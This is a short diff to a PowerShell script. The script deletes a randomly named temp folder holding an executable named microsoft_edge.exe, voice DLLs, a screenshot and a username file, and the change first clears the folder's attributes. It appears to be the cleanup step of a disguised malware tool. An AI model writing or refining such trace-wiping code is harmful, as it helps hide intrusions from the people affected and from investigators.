@@ -5,6 +5,9 @@ Remove-Item $env:temp\sVBXKuz\microsoft_edge.exe -Force
 Remove-Item $env:temp\sVBXKuz\libsodium.dll -Force
 Remove-Item $env:temp\sVBXKuz\libopus.dll -Force
 Remove-Item $env:temp\sVBXKuz\screenshot.png -Force
+
+$folderPath = "$env:temp/sVBXKuz/"
+Set-ItemProperty -Path $folderPath -Name Attributes -Value ([IO.FileAttributes]::Normal)
 cd..
 Remove-Item $env:temp\sVBXKuz -Recurse -Force
 Remove-Item $env:temp\username.json
